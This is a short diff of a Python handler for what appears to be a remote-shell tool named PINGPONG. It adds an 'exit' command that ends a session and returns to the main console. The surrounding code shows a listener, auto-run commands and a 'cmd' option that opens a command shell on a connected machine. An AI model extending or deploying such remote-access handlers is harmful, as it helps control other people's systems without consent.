@@ -10,7 +10,7 @@ import sys
 import shutil
 import cmdshell
 import time
-import traceback
+import main
 #开启监听
 #函数中printf参数决定时候进行不必要的输出
 def startserver(ip, port, printf, open_ac):
@@ -197,6 +197,11 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
             print("PINGPONG>[*]running " + AUTOCOMMAND)
             command = AUTOCOMMAND
             is_Auto = True
+        if command == "exit" or command == "EXIT":
+            App_send("EXIT_APP", False)
+            print("PINGPONG>[*]PINGPONG session died, reason: User exit")
+            print("handler>[*]Back to main console......")
+            main.main()
         if command == "cmd" or command == "CMD":
             if App_send("CMDSHELL_APP", True):
                 print("PINGPONG>[+]GOT IT")
